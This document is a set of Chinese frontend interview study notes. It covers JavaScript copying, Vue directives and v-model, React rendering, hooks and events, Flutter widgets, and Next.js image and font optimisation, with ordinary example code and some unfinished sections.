**浅拷贝**是创建一个**新对象**，这个对象有着原始对象属性值的拷贝。如果属性是**基本类型**，拷贝的就是基本类型的**值**，如果属性是**引用类型**，拷贝的就是**内存地址** ，所以**如果其中一个对象改变了这个地址，就会影响到另一个对象**。（两个对象依然共享引用类型属性的内存）

**深拷贝**是从堆内存中开辟一个新的区域存放新对象,且**修改新对象不会影响原对象**，（两个对象不再共享引用类型属性的内存）

**如何实现浅拷贝？**

- 展开运算符

**如何实现深拷贝？**

- JSON 的序列化（stringify）和解析（parse），但是这不会对函数进行处理~

# Vue

- v-if 和 v-show
- v-if 和 v-for 优先级
- key 的作用
- 双向数据绑定
- 响应式系统
- 自定义指令
- 在项目中遇到什么困难？怎么解决的？

## v-if 和 v-show

`v-if` 是“真实的”按条件渲染，因为它确保了在切换时，条件区块内的事件监听器和子组件都会被销毁与重建；

`v-if` 也是**惰性**的：如果在初次渲染时条件值为 false，则不会做任何事。条件区块只有当条件首次变为 true 时才被渲染‘

相比之下，`v-show` 简单许多，元素无论初始条件如何，始终会被渲染，只有 CSS `display` 属性会被切换；

总的来说，`v-if` 有更高的切换开销，而 `v-show` 有更高的初始渲染开销。因此，如果需要频繁切换，则使用 `v-show` 较好；如果在运行时绑定条件很少改变，则 `v-if` 会更合适；

## v-if 和 v-for 优先级

同时使用 `v-if` 和 `v-for` 是**不推荐的**，因为这样二者的优先级不明显；

当它们同时存在于一个节点上时，**`v-if` 比 `v-for` 的优先级更高（vue2 则反过来）。**这意味着 `v-if` 的条件将无法访问到 `v-for` 作用域内定义的变量别名：

```vue
<!--
 这会抛出一个错误，因为属性 todo 此时
 没有在该实例上定义
-->
<li v-for="todo in todos" v-if="!todo.isComplete">
  {{ todo.name }}
</li>
```

在外新包装一层 `<template>` 再在其上使用 `v-for` 可以解决这个问题 (这也更加明显易读)：

```vue
<template v-for="todo in todos">
  <li v-if="!todo.isComplete">
    {{ todo.name }}
  </li>
</template>
```

## key

key 会给每个 vnode 唯一 id，是 diff 算法的一种优化策略；

可以根据 key，更准确、更快的找到对应 vnode 节点；

进行 diff 算法的时候，要进行比对虚拟 DOM，当出现大量的相同的标签时，vnode 会根据 key 和标签名是否一致，若一致再去判断子节点；

这样可以提升判断的速度，在页面重新渲染时更快，消耗更少；

## 双向数据绑定

**双向数据绑定是什么？**

把 `model` 绑定到 `view` 上，当使用 `JavaScript` 代码更新 `model` 时，`view` 就会自动更新，这是**单向数据绑定**；

在单向数据绑定的基础上，当用户更新了 `view` ，那 `model` 的数据也自动更新，这就是 **双向数据绑定**。

**原理是什么？**

它主要有三个重要部分构成：

- 数据层（model）
- 视图层（view）
- 业务逻辑层（viewmodel）

viewmodel 主要的职责是：

- 数据变化后更新视图
- 视图更新后更新数据

**如何实现？**

Vue 的双向数据绑定表现为 `v-model` 指令；

而 v-model 其实是 `v-bind` 和 `v-on` 的语法糖：v-bind 绑定数据，将它加入**响应式系统**，而 v-on 当数据变化时会触发某个事件，从而更新数据；

**作用在普通表单元素上**

```html
<input v-bind:value="message" v-on:input="message=$event.target.value" />
```

//$event 指代当前触发的事件对象;
//$event.target 指代当前触发的事件对象的 dom;
//$event.target.value 就是当前 dom 的 value 值;

- **「接收一个 value 属性」**
- **「在 value 值改变时 触发 xxx 事件」**

**在自定义组件中**

v-model 默认会利用名为 **value** 的 **prop** 和名为 **input 的事件**

## 响应式系统

## 自定义指令

自定义指令是**复用**代码的一种方式，主要是为了复用涉及普通元素的**底层 DOM**的访问逻辑；

使用前先**注册**，分全局和局部；

全局注册主要是通过`Vue.directive`方法进行注册

`Vue.directive`第一个参数是指令的名字（不需要写上`v-`前缀），第二个参数可以是对象数据，也可以是一个指令函数

```js
// 注册一个全局自定义指令 `v-focus`
Vue.directive("focus", {
  // 当被绑定的元素插入到 DOM 中时……
  inserted: function (el) {
    // 聚焦元素
    el.focus(); // 页面加载完成之后自动让输入框获取到焦点的小功能
  },
});
```

局部注册通过在组件`options`选项中设置`directive`属性

```js
directives: {
  focus: {
    // 指令的定义
    inserted: function (el) {
      el.focus() // 页面加载完成之后自动让输入框获取到焦点的小功能
    }
  }
}
```

然后你可以在模板中任何元素上使用新的 `v-focus` property，如下：

```vue
<input v-focus />
```

### 应用场景

- 表单防止重复提交
- 图片懒加载
- 一键 Copy 的功能
- 拖拽指令
- 页面水印
- 权限校验

**表单防止重复提交**

```js
// 1.设置v-throttle自定义指令
Vue.directive('throttle', {
  bind: (el, binding) => {
    let throttleTime = binding.value; // 节流时间
    if (!throttleTime) { // 用户若不设置节流时间，则默认2s
      throttleTime = 2000;
    }
    let cbFun;
    el.addEventListener('click', event => {
      if (!cbFun) { // 第一次执行
        cbFun = setTimeout(() => {
          cbFun = null;
        }, throttleTime);
      } else {
        event && event.stopImmediatePropagation();
      }
    }, true);
  },
});
// 2.为button标签设置v-throttle自定义指令
<button @click="sayHello" v-throttle>提交</button>
```

**图片懒加载**

```js
const LazyLoad = {
  // install方法
  install(Vue, options) {
    // 代替图片的loading图
    let defaultSrc = options.default;
    Vue.directive("lazy", {
      bind(el, binding) {
        LazyLoad.init(el, binding.value, defaultSrc);
      },
      inserted(el) {
        // 兼容处理
        if ("IntersectionObserver" in window) {
          LazyLoad.observe(el);
        } else {
          LazyLoad.listenerScroll(el);
        }
      },
    });
  },
  // 初始化
  init(el, val, def) {
    // data-src 储存真实src
    el.setAttribute("data-src", val);
    // 设置src为loading图
    el.setAttribute("src", def);
  },
  // 利用IntersectionObserver监听el
  observe(el) {
    let io = new IntersectionObserver((entries) => {
      let realSrc = el.dataset.src;
      if (entries[0].isIntersecting) {
        if (realSrc) {
          el.src = realSrc;
          el.removeAttribute("data-src");
        }
      }
    });
    io.observe(el);
  },
  // 监听scroll事件
  listenerScroll(el) {
    let handler = LazyLoad.throttle(LazyLoad.load, 300);
    LazyLoad.load(el);
    window.addEventListener("scroll", () => {
      handler(el);
    });
  },
  // 加载真实图片
  load(el) {
    let windowHeight = document.documentElement.clientHeight;
    let elTop = el.getBoundingClientRect().top;
    let elBtm = el.getBoundingClientRect().bottom;
    let realSrc = el.dataset.src;
    if (elTop - windowHeight < 0 && elBtm > 0) {
      if (realSrc) {
        el.src = realSrc;
        el.removeAttribute("data-src");
      }
    }
  },
  // 节流
  throttle(fn, delay) {
    let timer;
    let prevTime;
    return function (...args) {
      let currTime = Date.now();
      let context = this;
      if (!prevTime) prevTime = currTime;
      clearTimeout(timer);

      if (currTime - prevTime > delay) {
        prevTime = currTime;
        fn.apply(context, args);
        clearTimeout(timer);
        return;
      }

      timer = setTimeout(function () {
        prevTime = Date.now();
        timer = null;
        fn.apply(context, args);
      }, delay);
    };
  },
};
export default LazyLoad;
```

**一键 Copy 的功能**

```js
    el.$value = value; // 用一个全局属性来存传进来的值，因为这个值在别的钩子函数里还会用到
    el.handler = () => {
      if (!el.$value) {
      // 值为空的时候，给出提示，我这里的提示是用的 ant-design-vue 的提示，你们随意
        Message.warning('无复制内容');
        return;
      }
      // 动态创建 textarea 标签
      const textarea = document.createElement('textarea');
      // 将该 textarea 设为 readonly 防止 iOS 下自动唤起键盘，同时将 textarea 移出可视区域
      textarea.readOnly = 'readonly';
      textarea.style.position = 'absolute';
      textarea.style.left = '-9999px';
      // 将要 copy 的值赋给 textarea 标签的 value 属性
      textarea.value = el.$value;
      // 将 textarea 插入到 body 中
      document.body.appendChild(textarea);
      // 选中值并复制
      textarea.select();
      // textarea.setSelectionRange(0, textarea.value.length);
      const result = document.execCommand('Copy');
      if (result) {
        Message.success('复制成功');
      }
      document.body.removeChild(textarea);
    };
    // 绑定点击事件，就是所谓的一键 copy 啦
    el.addEventListener('click', el.handler);
  },
  // 当传进来的值更新的时候触发
  componentUpdated(el, { value }) {
    el.$value = value;
  },
  // 指令与元素解绑的时候，移除事件绑定
  unbind(el) {
    el.removeEventListener('click', el.handler);
  },
};

export default vCopy;
```

## 在项目中遇到什么困难？怎么解决的？

可以使用**star**法则：

situation（背景信息）：事情是在**什么情况**下发生，比如生产环境 xxx 问题；

target（目标任务）：你的**目标任务**是什么，比如保证线上服务稳定、分析问题产生原因；

action（采取的行动）：针对这样的情况分析，采用了**什么行动**，比如先重启保证服务正常，之后在进行分析；

result（取得的成果）：结果怎样，再这样的情况下**学到了什么**；

比如我遇到的一个问题：

**背景**

下班回家了，当天的功能已经提交，并且已经发布到生产环境的服务器上了（第二天客户要验收），我负责的那个**模块首页一直在加载，一直不出内容**

**目标**

组长叫我尽快解决，然后提交修改后的代码，**重新发布，保证上线服务**。

**行动**

然后我就看看开发环境的代码，分析产生的原因，然后定位到问题是**递归渲染**，导致死循环

我就修改了对某个数据的监听（使用 useEffect 监听某个数据），去掉对它的依赖，然后控制台也没有提示了；

**结果**

最后也能顺利发布到生产环境，这次的经验告诉我，开发环境报的**提示一定要解决**，不然搞不好到生产环境会出问题

# flutter

- Flutter 是什么？Flutter 和其他移动开发框架有什么不同之处？
- Flutter 中的 StatefulWidget 和 StatelessWidget 有什么区别？在什么情况下应该使用它们？
- Flutter 的路由是什么？如何在 Flutter 应用程序中实现导航？
- Flutter 中的 BuildContext 是什么？它有什么作用？
- Flutter 中的 Widget 是什么？它们是如何工作的？
- Flutter 中的 Layout 和 Container Widget 有什么作用？它们是如何使用的？
- Flutter 中的动画是如何实现的？如何创建动画？
- Flutter 中的异步编程是如何工作的？有哪些常用的异步编程模型？
- Flutter 中的插件是什么？如何在 Flutter 应用程序中使用插件？
- Flutter 中的国际化是如何工作的？如何为应用程序添加多语言支持？

## Flutter 是什么？Flutter 和其他移动开发框架有什么不同之处？

flutter 是一个**快速**、**灵活**且具有**高性能**的**移动应用框架**，可以大大提高开发效率和用户体验。

与其他移动开发框架相比，flutter 具有以下不同之处：

- **构建性能**：flutter 使用自己的**渲染引擎**，可以**直接绘制**ui 组件，**无需通过原生控件**控制进行渲染，这使得应用程序具有更高的渲染性能和流畅度；
- **代码复用（跨平台）**：flutter 支持使用**单一代码库**构建应用程序，可以通过 flutter 框架在**不同平台**上构建应用程序，从而实现代码的复用；
- **热重载**：flutter 的热重载功能看在应用程序运行时**快速预览**、**调试**ui 和业务逻辑，使得开发人员可以更快的进行迭代和调试
- **自定性**：flutter 具有丰富的**自定义组件**和**动画库**，可以帮助开发人员构建出具有**高度个性化**的移动应用；

## **Flutter 中的 Widget 是什么？它们是如何工作的？**

是一种用来**构建用户界面**的**基本元素**，类似于**组件**；

widget 是不可变的，一旦创建就不会改变，而是通过构建新的 widget 树来更新用户界面；

flutter 的 widget 分两种类型：

- StatelessWidget（无状态）
- StatefulWidget（有状态）

StatelessWidget 的属性在构建后**不会再改变**；

StatefulWidget 则不然，在构建后可能发生变化。当 StatefulWidget 中的**属性**发生变化时，flutter 会**重新构建 widget 树**，并重新渲染用户界面；

flutter 中的 widget 是根据**用户界面的层次**结构来组织的，每个 widget 可以有一个或多个子 widget，形成 widget 树。当需要更新用户界面时，flutter 会对**整个 widget**进行重建，而不是对发生变化的部分进行局部更新；

在构建 widget 树时，flutter 会使用一种叫做**渲染对象树**的技术，将**widget**转换成对应的**渲染对象**（RenderObject），并通过渲染对象实现用户界面的绘制。**渲染对象树**中的每个**节点**都与 widget 树中的一个 widget 对应，它们负责将 widget 树中的**布局信息**转换成实际的**绘制命令**；

在 flutter 中，widget 和渲染对象是**分离**的，它们之间的转换由框架自动完成，开发者无需关心具体的实现细节。这使得 flutter 可以在不同平台上实现统一的用户界面，**跨平台**；

# React

## 不通过 set ，直接改 state 的属性，会触发重渲染吗，为什么?

不会。核心原因是 React 依赖**「状态的不可变性」**和**「引用比较」**来判断是否需要重渲染，直接修改会破坏这一机制。

React 组件的重渲染触发逻辑基于 **“状态引用是否改变”**：

- 当你通过 `setState` 或 `setXxx` 更新状态时，React 会将新状态与旧状态进行**浅比较**（检查引用是否不同）。如果引用不同，React 会认为状态发生了变化，进而触发组件重渲染，并更新 DOM。
- 若直接修改 `state` 的属性（如 `state.count = 1` 或 `state.obj.name = 'new'`），**状态对象的引用并未改变**（还是原来的那个对象 / 数组）。React 的浅比较会认为 “状态没变”，因此不会触发重渲染，组件视图也不会更新。

**为什么 React 要这样设计？**

- **性能优化**：如果 React 对状态进行 “深比较”（检查对象内部所有属性是否变化），会消耗大量计算资源（尤其对于复杂对象）。而 “浅比较（引用比较）” 非常高效，能快速判断是否需要重渲染。
- **状态可预测性**：强制通过 `set` 方法更新状态，确保状态变化是 “可追踪的”（每次更新都会生成新状态），便于调试和理解组件状态流转（例如通过 React DevTools 查看状态历史）。
- **协调算法（Reconciliation）依赖**：React 的虚拟 DOM 对比算法需要通过 “新旧状态的引用变化” 来判断哪些组件需要重新渲染，直接修改状态会导致算法失效，出现 “状态与 UI 不一致” 的问题。

## react里面什么是高阶组件

## 为什么不能在if或for循环里面写hook？

## **react18有哪些新特性？**

- 并发渲染（解决之前“一旦开始，必须完成”）
  - crateRoot替代ReactDOM.render
- 自动批处理，减少重新渲染次数（合并多个状态更新为一次渲染）
- 过渡API useTransition（标记非紧急更新，避免阻塞用户交互）
- Suspense 增强与服务器组件（Server Components）
  - 允许客户端用suspense等待异步数据
  - 允许服务器直接渲染组件（无需客户端js），减少客户端bundle体积，提升首屏加载速度
  - 两者结合，可实现“流式渲染”

- 严格模式增强
  - 渲染两次，帮助开发者发现副作用问题

## **react19有哪些新特性？**



## **React渲染流程？**

当状态（State）改变时，React 会重新渲染组件树，计算出变化后的虚拟 DOM（React Element Tree）;

上一次的虚拟 DOM 进行对比（Diffing）;

将实际变化的部分应用到真实的浏览器 DOM 上;

主要分为两个阶段：

- **渲染阶段 (Render Phase)**
  - 这个阶段的任务是**计算**和**对比**，但**不会**直接改变真实的 DOM。这个过程可以被中断、暂停或重启，这是 React 实现并发特性（如 Concurrent Mode）的基础。
    1. 触发渲染（Trigger），状态发生了改变，调度一次新的渲染
    2. 虚拟 DOM 的协调，也就是diff。
       - 基于Props 和 State，**重新调用**组件的渲染函数
       - 这次调用会返回一个**新的 React 元素树（即虚拟 DOM）**
       - React 会将这棵新树与上一次渲染的旧树进行**比较（Diffing）**
    3. 生成 Effect 列表
       - 在协调过程中，React 不仅是在找差异，还会为那些需要**副作用（Effects）** 的 Fiber 节点（React 内部的工作单元）打上标签（Effect Tag）
       - **副作用包括：** 需要插入、更新或删除 DOM 节点，需要执行 `useEffect` 或 `useLayoutEffect` 的回调函数等
       - React 会最终生成一个所有带有副作用的 Fiber 节点的列表

- **提交阶段 (Commit Phase)**
  - 这个阶段是**同步的、不可中断的**。React 会一口气将上个阶段计算出的所有变更应用到真实的 DOM 上，确保用户不会看到不一致的界面状态。
    1. **应用 DOM 更新**：
       - React 会遍历在渲染阶段生成的 Effect 列表。
       - 它执行所有必要的 DOM 操作，包括：**插入、更新和删除**真实的 DOM 节点。
       - 此时，浏览器会重新计算页面的样式和布局（Reflow/Layout），但用户还看不到最终结果
    2. **执行生命周期方法和 Effect 钩子**：
       - **DOM 更新完成后，React 会同步执行 `componentDidMount` 和 `componentDidUpdate` 生命周期方法（类组件）。**
       - **然后，它会调度 `useLayoutEffect` 的回调函数。** 这些回调是同步执行的，可以在这里读取最新的 DOM 布局。
       - **最后，React 会异步调度 `useEffect` 的回调函数。** 这意味着它们会在浏览器完成绘制（Paint）之后执行，不会阻塞页面的显示。
    3. **浏览器绘制（Paint）**：
       - 提交阶段的所有操作（DOM 更新、同步钩子）都完成后，浏览器会将最终像素绘制到屏幕上，用户就看到更新后的界面了。

**简单比喻：**

- **渲染阶段** 就像建筑师在**修改蓝图**，计算哪里需要增加一堵墙，哪里需要拆掉一扇窗。
- **提交阶段** 就像施工队**按照最终蓝图施工**，一口气把墙砌好，把窗户拆掉。

## diff理解？

- **对比不同类型的元素：** 如果根元素类型不同（如从 `<div>` 变成 `<span>`），React 会直接拆毁整个旧的 DOM 树并重建新的。
- **对比同类型的元素：** 如果元素类型相同（如 `<div className="before">` 和 `<div className="after">`），React 会保留底层的 DOM 节点，只更新有变化的属性（在这个例子中，只更新 `className`）。
- **对比子元素：** 当递归子节点时，默认情况下 React 会同时遍历新旧子元素列表。当发现差异时，就会生成一个更新。为了高效，**使用 `key` 属性非常重要**。`key` 帮助 React 识别哪些子项是新增、删除或移动的，从而避免不必要的重新创建。

## **Fiber架构了解多少？**

## **react中如何避免组件重复渲染？react.memo如何做到跳过重新渲染？useCallback和useMemo有什么区别？**

- `React.memo` 缓存组件，只关注props，浅比较
- `useCallback` 缓存函数 props，保证其地址不变
  - 父组件传递给子组件的 **函数 props** 若每次渲染都重新创建（如箭头函数），会导致子组件的 props 引用变化，即使 `React.memo` 也会触发重渲染。
- `useMemo` 缓存计算结果 / 对象 props
  - 简单计算不要，增加内存开销

优化须知： 先通过 React DevTools 的 “Highlight Updates” 功能定位重复渲染的组件，再针对性优化（避免过度优化）



## 类组件与函数组件区别

> 基础认知

本质上代表不同的设计思想和心智模式；

- 类组件的根基是oop，面向对象编程，可以实现继承；
- 函数组件的根基是fp，函数式编程；

> 独特点

- 相对于类组件，函数组件更纯粹、易测试；
- 类组件通过生命周期组织业务逻辑，比如请求常放 `componentDidMount`中

> 性能优化

- 类组件依靠 `componentShouldUpdate` 去阻断渲染；
- 函数组件依靠React.memo缓存渲染结果去减少渲染；

> 未来趋势

hook的推出，促进函数组件的发展

## Hook使用有哪些限制

主要有两点：

- 在函数函数式顶层调用hooks；
- 不要在循环、条件判断或者子函数中使用hooks；

只要是因为**React依赖于Hooks的调用顺序来正确地保存和更新状态**；

若在条件或循环中调用hook，可能导致每次渲染时，hook调用顺序不一致，从而导致错误；

hook的工作原理主要是通过一种叫做**fiber的数据结构**来保存和更新状态；

每个组件都有一个与之关联的fiber，每个fiber都有一个保存hooks状态的链表；

当调用例如useState或useEffect这样的hook时，React会在当前fiber的hooks链表中添加一个新状态或副作用；

然后，当组件重新渲染时，React回按照hooks的调用顺序来更新这些状态和副作用；

## useEffect使用场景、坑

> 场景

- **数据获取**：可以在useEffect中获取数据，然后更新组件状态；
- **订阅/取消订阅**：可以在useEffect中订阅一些事件，然后再清理函数中取消订阅；
- **DOM操作**

> 坑

- **清理函数：**useEffect可以返回一个清理函数，用于在组件卸载或useEffect重新执行一些清理操作。如果忘记返回清理函数，可能会导致**内存泄漏**。
- **异步操作：**useEffect不能直接异步，如果需要在useEffect中执行异步操作，你需要再useEffect中定义一个异步函数，然后调用它。

假设你在`useEffect`中发起了一个异步请求，然后在请求完成后更新组件的状态;

如果在请求完成前组件被卸载，当请求完成后**尝试更新已经卸载的组件的状态**时，就会导致错误。

```js
useEffect(() => {
  async function fetchData() {
    const response = await fetch('https://api.example.com/data');
    const data = await response.json();
    setData(data);  // 如果此时组件已经卸载，这里会导致错误
  }

  fetchData();
}, []);
```

为了避免这种情况，你可以在`useEffect`的清理函数中设置一个标志，然后在异步操作完成后检查这个标志：

```js
useEffect(() => {
  let isMounted = true;

  async function fetchData() {
    const response = await fetch('https://api.example.com/data');
    const data = await response.json();

    if (isMounted) {
      setData(data);
    }
  }

  fetchData();

  return () => {
    isMounted = false;
  };
}, []);
```

在这个例子中，如果组件在请求完成前被卸载，清理函数会被执行，`isMounted`会被设置为`false`。然后在异步操作完成后，检查`isMounted`，如果它是`false`，就不更新状态，从而避免了错误。

## Context应用场景、缺陷

Context允许在组件树中共享值，无需通过props层层传递

> 场景

- **主题切换**：可以存储应用的**主题信息**，然后在需要的组件中读取这个信息；
- **多语言**：可以存储当前的**语言设置**，然后在需要的组件中读取；
- **用户认证**：可以存储当前**用户信息**，在需要的组件中读取；

> 缺陷

- **性能问题：**当一个Context值改变时，所有消费这个Context的组件都会**重新渲染**（此时可能需要一些优化手段，比如React.Memo、shouldComponemUpdate）；
- **复杂性增加：**虽然Context可以避免props“逐层传递”，但也可能导致**数据流难以追踪**，增加了应用的复杂性；

## react事件机制

React 的事件机制是对原生 DOM 事件的**封装与优化**，核心目标是实现**跨浏览器兼容性**、**统一事件接口**和**高效的事件处理**。它并非直接使用原生 DOM 事件，而是通过一层 “合成事件（SyntheticEvent）” 系统实现，具体机制可从以下几个核心维度理解：

### 合成事件（SyntheticEvent）

React 不会将事件处理函数直接绑定到 DOM 元素上，而是**自己实现了一套事件系统**，所有通过 `onXxx`（如 `onClick`、`onChange`）绑定的事件，都是 React 合成事件，而非原生 DOM 事件。

**合成事件的特点**：

- 接口与原生事件一致（如 `e.target`、`e.preventDefault()`、`e.stopPropagation()`），开发者无需学习新 API；
- 跨浏览器兼容：React 会自动处理不同浏览器的事件差异（如 IE 的 `attachEvent` 与标准浏览器的 `addEventListener`），开发者无需手动兼容；
- 是原生事件的 “包装器”：合成事件对象内部包含原生事件（可通过 `e.nativeEvent` 获取），但行为可能略有差异（如事件冒泡的控制）。

### 事件委托（Event Delegation）

React 采用**事件委托（事件代理）** 模式处理事件，而非为每个元素单独绑定事件，这是其性能优化的关键：

- **事件绑定到顶层容器**：所有 React 事件的处理函数，最终都会被委托到 **React 应用的根节点**（如 `#root`，在 React 17 之前是 `document`）上，而非具体的 DOM 元素。
  - 例如，给列表项绑定 `onClick`
  - 实际运行时，React 不会给每个 `<li>` 绑定 `click` 事件，而是在 `<ul>` 的父节点（最终到根节点）上绑定一个全局事件处理函数，通过**事件冒泡**统一处理所有子元素的点击。
- **事件分发流程**：
  - 当用户触发某个事件（如点击）时，流程如下：
    - ① 原生 DOM 事件触发，按原生机制冒泡到 React 根节点；
    - ② 根节点的全局事件处理函数捕获到事件，React 内部根据事件类型（如 `click`）和目标元素（`e.target`），找到对应的 React 组件及绑定的事件处理函数；
    - ③ React 创建**合成事件对象**（`SyntheticEvent`），并将其传递给组件的事件处理函数；
    - ④ 事件处理函数执行，完成后合成事件对象会被销毁（无法在异步操作中访问，需提前保存 `e.target` 等属性）。

## 虚拟DOM

虚拟DOM是将真实DOM抽象成js对象。

### 优势

- 跨平台
- 保证性能下限

### diff算法

1. 将真实DOM映射成虚拟DOM；
2. 当虚拟DOM发生变化时，对比新旧两颗虚拟DOM树，计算补丁（patch）；**生成补丁**
3. 根据patch操作真实DOM；**更新差异**
4. 界面更新；

### 3个优化策略

- **基于树进行对比**：两棵树只对**同一层次**的节点进行比较；如果发现节点已经不存在了，则该节点及其子节点会被完全删除，不会进一步的比较。
- **基于组件进行对比**：如果组件的class一致，则默认为相似的树结构。在组件对比的过程中，如果组件是**同一类型**则进行树比对，如果不是则直接放入**补丁**中只要父组件类型不同，就会被重新渲染。
- **基于节点进行对比：**同一层级的子节点，可以通过**标记key**的方式进行列表对比。

## React18新特性

- **并发模式**（Concurrent Mode）: 全新的**渲染模式**，它可以让react在渲染过程中**不阻塞**主线程，从而使应用保持响应。
- **React Server Component**：在服务器上运行的React组件，它们可以生成html并发送到客户端，而无需包含任何JavaScript；
- **新的Root API**：用于创建和管理React树的根，使得并发模式成为可能（ReactDOM.render-> ReactDOM.createRoot）；
- 等等



# Next.js

## 为什么选择next.js?

- **React 生态的深度整合**:作为 React 官方推荐框架，与 React 生态无缝兼容（如 React Router、React Query、Redux 等），支持最新的 React 特性（如 Hooks、RSC），对 React 开发者友好度极高;
- **渲染策略的极致灵活性**:
  - App Router 引入的 React Server Components（RSC）是革命性的渲染模式：服务端组件无需打包到客户端 JS，大幅减少客户端资源体积；
  - ISR（增量静态再生）成熟度高，支持按需 / 定时更新静态页面，平衡性能与动态性（如电商商品页）;

- **性能优化细节拉满**
  - 自动代码分割（按页面 / 组件拆分 JS）；
  - 内置`next/image`组件（自动优化图片尺寸、格式、懒加载）；
  - `next/font`优化字体加载（避免布局偏移）;
  - 边缘渲染（Edge Rendering）支持，降低全球用户访问延迟;

- **部署与规模化能力**
  - 与 Vercel（Next.js 开发者的平台）深度集成，一键部署，支持自动预览、CI/CD；同时兼容 AWS、Docker 等多种部署方式，适合大型项目规模化落地（如 TikTok、Netflix 的部分业务）

## next/image ,next/font 性能优化的原理

- `next/image` 核心通过**响应式尺寸、现代格式、懒加载 / 预加载、布局稳定性**优化图片加载，提升 LCP 和 CLS；
- `next/font` 核心通过**本地化加载、预加载、体积优化、显示策略**优化字体渲染，减少 FOIT/FOUT，提升用户体验。

### **next/image**

- **响应式图片自动生成（适配多设备）**:传统图片加载通常使用固定尺寸，可能导致 “大图片在小屏幕上加载”（浪费带宽）或 “小图片在大屏幕上拉伸”（模糊）。`next/image` 会在构建或运行时（根据配置）自动生成**多种尺寸的图片**（如 100px、200px、400px 等），并通过 `srcset` 和 `sizes` 属性告知浏览器，让浏览器根据用户设备的屏幕尺寸、分辨率自动选择最合适的图片尺寸加载。生成的图片标签会包含 `srcset="image-100w.jpg 100w, image-200w.jpg 200w"`，浏览器根据当前视口宽度选择最优尺寸，避免资源浪费。
- **自动转换为现代高效格式**:图片格式对体积影响极大（如相同质量下，WebP 体积比 JPEG 小 30%+，AVIF 比 WebP 小 25%+）。`next/image` 会自动检测浏览器支持性，并将图片转换为**现代高效格式**（如 WebP、AVIF），同时保留传统格式（如 JPEG、PNG）作为降级方案。例如：现代浏览器加载 WebP/AVIF，旧浏览器自动 fallback 到 JPEG，在不牺牲兼容性的前提下减少图片体积，加快加载速度。
-  **懒加载（延迟加载非首屏图片）**:默认情况下，`next/image` 会对**非首屏图片**启用懒加载（通过 `loading="lazy"`），即只有当图片滚动到视口附近时才开始加载。这能减少初始页面的资源请求量，降低首屏加载时间（TTFB、FCP），尤其对长页面（如商品列表、文章页）效果显著。
- **预加载关键图片（提升 LCP）**:对于首屏的关键图片（如 Banner、主视觉图），可通过 `priority` 属性标记为 “优先加载”。此时 `next/image` 会自动添加 `<link rel="preload">` 标签，让浏览器在 HTML 解析早期就优先加载该图片
-  **防止布局偏移（减少 CLS）**:布局偏移（CLS）是指页面元素加载过程中位置突然变化（如图片加载前无占位空间，加载后 “撑开” 页面），会严重影响用户体验。`next/image` 强制要求设置 `width` 和 `height`（或通过 `fill` 模式自适应父容器），浏览器会根据尺寸提前预留空间，确保图片加载前后布局稳定，从根源上减少 CLS。
-  **边缘缓存与 CDN 分发**:`next/image` 生成的图片默认通过 Next.js 的**图像优化服务**处理（可配置为 Vercel CDN 或自托管服务），图片资源会被缓存到全球边缘节点。用户访问时，从最近的节点获取图片，减少网络延迟（RTT），提升加载速度。

**响应式尺寸原理**：next.config.js的images + 组件with

```js
// next.config.js
module.exports = {
  images: {
    // 自定义全屏图片尺寸（适配设备屏幕）
    deviceSizes: [360, 768, 1200, 1440, 1920], // 手机、平板、桌面中等、桌面大屏、超大屏
    // 自定义小图片尺寸（非全屏元素）
    imageSizes: [40, 80, 160, 320], // 头像、小卡片等
  },
};
```

**组件使用与尺寸生成逻辑**:配置后，`next/image` 会根据组件的 `width` 属性和上述配置，自动生成最接近的尺寸（并通过 `srcset` 暴露给浏览器）。

示例 1：小图片（使用 `imageSizes`）

```jsx
// 头像组件（小尺寸，使用 imageSizes 中的尺寸）
import Image from 'next/image';

export default function Avatar() {
  return (
    <Image
      src="/avatar.jpg" // 本地图片（静态资源）
      alt="用户头像"
      width={80} // 目标宽度 80px
      height={80}
    />
  );
}
```

- 由于 `imageSizes` 中配置了 `80`，Next.js 会生成 80px 尺寸的图片，并可能补充接近的尺寸（如 40px、160px，供不同场景复用）。
- 生成的 `srcset` 类似：`/avatar-40w.jpg 40w, /avatar-80w.jpg 80w, /avatar-160w.jpg 160w`，浏览器根据实际需求选择。

示例 2：全屏图片（使用 `deviceSizes`）

```jsx
// 首页 Banner（大尺寸，使用 deviceSizes 中的尺寸）
import Image from 'next/image';

export default function HeroBanner() {
  return (
    <Image
      src="/banner.jpg"
      alt="首页Banner"
      width={1200} // 目标宽度 1200px
      height={600}
      priority // 首屏关键图，预加载
    />
  );
}
```

- 由于 `deviceSizes` 中配置了 `1200`，Next.js 会生成 1200px 尺寸的图片，同时补充更大的尺寸（如 1440px、1920px），供大屏设备使用。
- 生成的 `srcset` 类似：`/banner-768w.jpg 768w, /banner-1200w.jpg 1200w, /banner-1440w.jpg 1440w`。

**构建时 vs 运行时生成**

图片尺寸的生成时机取决于**图片源和项目配置**：

- **本地图片（`/public` 目录下）**：
  - 若使用 **静态生成（SSG，如 `getStaticProps`）**，Next.js 会在 **构建时** 生成所有配置中定义的尺寸（避免运行时开销）。
  - 若使用 **服务端渲染（SSR）**，首次请求时会在 **运行时** 生成，后续缓存复用。

- **远程图片（需配置 `remotePatterns`）**：

  - 默认在 **运行时** 生成（通过 Next.js 图像优化服务动态处理）。

  - 若要在构建时预生成，需结合 `getStaticProps` 提前指定图片 URL，Next.js 会在构建时抓取并生成尺寸。

    ```js
    // next.config.js
    module.exports = {
      images: {
        deviceSizes: [768, 1200, 1440],
        imageSizes: [40, 80],
        remotePatterns: [
          {
            protocol: 'https',
            hostname: 'example.com', // 允许的远程图片域名
            pathname: '/images/**',
          },
        ],
      },
    };
    ```

    

**懒加载原理**

1. **初始阶段：不加载真实资源，只占位**：
   - **图片 / 视频**：将 `src` 或 `srcset` 替换为占位符（如空值、小尺寸占位图的 `data URI`，或 `loading="lazy"` 标记），避免浏览器自动触发加载。
   - **其他资源**：如长列表的非首屏内容，初始时不渲染 DOM，或仅渲染空容器。
2. **监听触发条件：判断资源是否 “即将被使用”**：通过监听用户行为或页面状态，判断资源是否进入 / 即将进入 “使用范围”（通常是视口，即用户可见区域）。核心触发条件是：**资源元素与视口的交叉状态**（是否重叠或即将重叠）。现代浏览器中，主要通过 **`Intersection Observer API`** 实现高效监听：
   - 它可以异步监听目标元素与视口（或其他祖先元素）的交叉状态（如元素进入视口、离开视口）。
   - 相比传统的 `scroll` 事件监听（需频繁计算元素位置，可能导致性能损耗），`Intersection Observer` 性能更优，不会阻塞主线程。
3. **触发加载：动态加载真实资源**
